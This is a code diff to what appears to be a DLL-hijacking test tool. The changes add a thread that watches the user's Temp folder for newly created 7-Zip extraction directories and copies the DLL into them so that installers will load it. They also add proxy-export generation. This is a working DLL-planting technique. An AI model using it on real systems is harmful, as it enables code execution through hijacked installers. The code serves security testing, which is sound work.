@@ -1,22 +1,111 @@
 // dllmain.cpp : Defines the entry point for the DLL application.
 #include <windows.h>
 
+static DWORD CALLBACK WatchDirectory(LPVOID pParam)
+{
+    // Credits: https://gist.github.com/nickav/a57009d4fcc3b527ed0f5c9cf30618f8
+
+    WCHAR path[MAX_PATH];
+    DWORD const path_len = ExpandEnvironmentStringsW(
+        L"%USERPROFILE%\\AppData\\Local\\Temp", path, MAX_PATH);
+
+    HANDLE file = CreateFile(path,
+        GENERIC_READ,
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL,
+        OPEN_EXISTING,
+        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
+        NULL);
+
+    if (file == INVALID_HANDLE_VALUE)
+        return 0;
+
+    OVERLAPPED overlapped;
+    overlapped.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+
+    union
+    {
+        DWORD dw[];
+        BYTE b[1024];
+    } change_buf;
+
+    while (ReadDirectoryChangesW(
+        file, &change_buf, sizeof change_buf, TRUE,
+        FILE_NOTIFY_CHANGE_DIR_NAME,
+        NULL, &overlapped, NULL))
+    {
+        DWORD bytes_transferred = 0;
+        GetOverlappedResult(file, &overlapped, &bytes_transferred, TRUE);
+
+        DWORD offset = 0;
+        do
+        {
+            FILE_NOTIFY_INFORMATION* event = (FILE_NOTIFY_INFORMATION*)(change_buf.b + offset);
+
+            WCHAR name[MAX_PATH];
+            DWORD name_len = event->FileNameLength / sizeof(WCHAR) + 1;
+            lstrcpynW(name, event->FileName, name_len);
+
+            if (event->Action == FILE_ACTION_ADDED)
+            {
+                if (name[0] == '7' && name[1] == 'z')
+                {
+                    path[path_len] = L'\0';
+                    lstrcatW(path, L"\\");
+                    lstrcatW(path, name);
+                    DWORD attr = GetFileAttributesW(path);
+                    if (attr & FILE_ATTRIBUTE_DIRECTORY)
+                    {
+                        GetModuleFileNameW(static_cast<HMODULE>(pParam), name, MAX_PATH);
+                        LPWSTR q = NULL;
+                        WCHAR full[MAX_PATH];
+                        GetFullPathNameW(name, MAX_PATH, full, &q);
+                        lstrcatW(path, L"\\");
+                        LPWSTR p = path + lstrlenW(path);
+                        lstrcpyW(p, q);
+                        CopyFileW(full, path, TRUE);
+                        // Copy any accompanying DLLs like so:
+                        // lstrcpyW(p, lstrcpyW(q, L"iertutil.dll"));
+                        // CopyFileW(full, path, TRUE);
+                        CloseHandle(file);
+                        return 0;
+                    }
+                }
+            }
+            offset = event->NextEntryOffset;
+        } while (offset); // as long as there are more events to handle
+    }
+}
+
 extern "C" BOOL WINAPI _DllMainCRTStartup(HMODULE hModule, DWORD ul_reason_for_call, LPVOID)
 {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH &&
         GetProcAddress(hModule, "DLLHijackTest_PostBuild") == NULL)
     {
+        // Notify user
         WCHAR szWho[MAX_PATH];
         GetModuleFileName(hModule, szWho, MAX_PATH);
         int ret = MessageBoxW(NULL,
             L"Shit happens. Do you want to know the details?", szWho, MB_YESNOCANCEL);
+        if (ret == IDCANCEL)
+            return FALSE;
+        // Observe what happens in %USERPROFILE%\AppData\Local\Temp
+        CreateThread(NULL, 0, WatchDirectory, hModule, 0, NULL);
+        if (ret == IDNO)
+            return TRUE;
         // Loader lock issues can happen, but installers can also silently kill threads.
         // Therefore, go without a dedicated thread for the UACSelfElevation dialog.
-        return ret != IDYES ? ret == IDNO :
-            wWinMain(hModule, NULL, lstrcpyW(szWho, L"DLLHijackTest"), SW_SHOWNORMAL) != IDABORT;
+        ret = wWinMain(hModule, NULL, lstrcpyW(szWho, L"DLLHijackTest"), SW_SHOWNORMAL);
+        return ret != IDABORT;
     }
     return TRUE;
 }
+
+#ifdef _WIN64
+extern "C" void _GapFiller() { }
+#else
+extern "C" void GapFiller() { }
+#endif
 
 static void CreateProxyFor(LPCSTR name)
 {
@@ -81,7 +170,7 @@ static void CreateProxyFor(LPCSTR name)
             if (rgfUsedOrdinals[j])
                 continue;
             char line[1024];
-            int length = wsprintfA(line, "#pragma comment(linker, \"/export:%u=KERNEL32.DebugBreak,@%u\")\n", j, j + pEAT->Base);
+            int length = wsprintfA(line, "#pragma comment(linker, \"/export:%u=_GapFiller,@%u,NONAME\")\n", j, j + pEAT->Base);
             _lwrite(file, line, length);
         }
 
@@ -97,7 +186,8 @@ void WINAPI DLLHijackTest_PostBuild(HWND, HINSTANCE, LPSTR lpCmdLine, int)
 {
     if (IsDebuggerPresent())
     {
-        CreateProxyFor(lpCmdLine);
+        //CreateProxyFor(lpCmdLine);
+        WatchDirectory(GetModuleHandle(L"DLLHijackTest.dll"));
         return;
     }
 
